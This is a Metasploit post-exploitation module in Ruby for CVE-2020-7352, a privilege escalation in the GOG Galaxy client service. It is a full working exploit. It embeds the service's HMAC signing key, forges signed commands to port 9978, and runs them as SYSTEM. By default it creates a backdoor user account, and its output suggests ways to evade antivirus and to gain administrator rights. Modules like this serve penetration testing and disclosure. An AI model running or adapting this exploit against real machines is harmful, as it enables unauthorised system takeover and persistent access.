##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/services'
require 'openssl'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(update_info(
      info,
      'Name'         => 'GOG GalaxyClientService Privilege Escalation',
      'Description'  => %q{
          This module will send arbitrary commands to the GOG GalaxyClientService, which will be executed
        with SYSTEM privileges (verified on GOG Galaxy Client v1.2.62 and v2.0.12; prior versions are
        also likely affected).
        },
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Joe Testa <jtesta[at]positronsecurity.com>'
      ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
      'References'   =>
            [
              ['URL', 'https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/'],
              ['CVE', '2020-7352']
            ]
    ))

    register_options(
      [
        OptString.new('CMD', [true, 'The command to execute with SYSTEM privileges', 'C:\\Windows\\System32\\net.exe']),
        OptString.new('ARGS', [false, 'The arguments for CMD', 'user newadmin 0mg*123L0l /add']),
        OptString.new('WORKING_DIR', [true, 'The initial working directory of the command', 'C:\\']),
      ])
  end

  def run
    command = datastore['CMD']
    args = datastore['ARGS']
    working_dir = datastore['WORKING_DIR']

    # The HMAC-SHA512 key for signing commands.
    key = "\xc8\x86\x07\xe1\x18\x22\x7a\x38\x05\xc4\x7f\x89\x3d\xa4\x1f\xcb\xdf\x16\x9e\xc9\xbb\xcb\xfd\xb1\x9a\x9f\x5b\x1f\xeb\x9f\x6c\x1e\x3c\x14\x46\x44\x6f\x9d\x8d\xfd\x67\x8e\xc6\xd4\x0c\x38\x20\xcb\x9a\x29\xb5\x2f\x5d\xb2\xfd\xb6\xf8\x0f\xf9\x5b\xf8\x50\xaa\x5d"

    print_status("Attempting to execute \"#{command} #{args}\" with SYSTEM privileges...")
    if command == 'C:\\Windows\\System32\\net.exe' and args == 'user newadmin 0mg*123L0l /add'
      print_warning('Warning: default command & args used.  To better evade AV/IDS, consider customizing these next time.')
    end

    # Start the GalaxyClientService.  It will automatically terminate after ~10
    # seconds of inactivity, so we don't need to bother shutting it down later.
    print_status("Starting GalaxyClientService...")
    ret = service_start('GalaxyClientService')
    if ret == 0 then
      print_status("Service started successfully.")
    elsif (ret == 1056) or (ret == 1) then
      print_warning("Service already running.  If the command execution fails, try it again in 15 seconds or so.")
    else
      print_status("Service status unknown (return code: #{ret}).  Continuing anyway...")
    end

    print_status("Connecting to service...")

    # Create a TCP socket.
    handler = client.railgun.ws2_32.socket('AF_INET', 'SOCK_STREAM', 'IPPROTO_TCP')
    s = handler['return']

    # Set timeout to 10 seconds (0xffff = SOL_SOCKET, 0x1006 = SO_RCVTIMEO).
    # This only affects the recv(), not connect().
    handler = client.railgun.ws2_32.setsockopt(s, 0xffff, 0x1006, [10000].pack('L<'), 4)

    # Set the socket address structure to localhost:9978.
    sock_addr = "\x02\x00"
    sock_addr << [9978].pack('n')
    sock_addr << Rex::Socket.addr_aton('127.0.0.1')
    sock_addr << "\x00" * 8

    # Connect to the service.  Retry up to 3 times, waiting 2 seconds in
    # between.
    connected = false
    retries = 0
    while (retries < 3) and (connected == false)
      retries += 1
      handler = client.railgun.ws2_32.connect(s, sock_addr, 16)
      if handler['GetLastError'] == 0 then
        connected = true
      else
        print_warning("Connection failed.  Waiting 2 seconds and trying again...")
        Rex.sleep(2)
      end
    end

    if connected == false
      print_error("Failed to connect to service.")
      return
    end

    print_status("Connected to service.  Sending payload...")

    # Build the header and payload, then calculate the HMAC-512 tag.
    header1 = "\x00\x93\x08\x04\x10\x01\x18"
    header2 = " \xa1\x90\xec\xe6\x05\xc2\x0c\x83\x01\n\x80\x01"
    payload = "\n" + command.length.chr + command + "\x12" + (command.length + args.length + 4).chr + "\"" + command + "\" " + args + " \x1a" + working_dir.length.chr + working_dir + " \x01(\x01"
    payload_hmac = OpenSSL::HMAC.hexdigest("SHA512", key, payload)
    data = header1 + payload.length.chr + header2 + payload_hmac + payload

    # Here, we are calling client.railgun.ws2_32.send().  However, there's a bug
    # somewhere in the railgun system such that send() is never called.  It
    # seems that some mystery code is intercepting send() instead of letting it
    # get to LibraryWrapper.method_missing() (perhaps 'send' is a special case
    # somewhere? The other ws2_32 functions work just fine...).  To work around
    # this problem, we will simply call it directly with call_function().
    send_func = client.railgun.ws2_32.functions['send']
    client.railgun.ws2_32._library.call_function(send_func, [s, data, data.length, 0], client)

    # Read the server's response.  On error, it returns nothing.
    response = "\x00" * 512
    handler = client.railgun.ws2_32.recv(s, response, response.length, 0)

    # Convert the unsigned return value to a signed value.
    ret = [handler['return'].to_i].pack('l').unpack('l').first
    if ret <= 0 then
      print_error("Failed to read response from service (return value from recv(): #{ret}).  This probably means the exploit failed.  :(")
    else
      print_good("Command executed successfully!")

      # If a new account was created, give the user a hint on how to add it to
      # the local Administrators group.
      if command.end_with? "net.exe" and args.include? ' /add'
        print_good("Hint: to add the new user to the local Administrators group, set the ARGS option to \"net localgroup Administrators [user] /add\"")
      end
    end

    client.railgun.ws2_32.closesocket(s)
  end
end
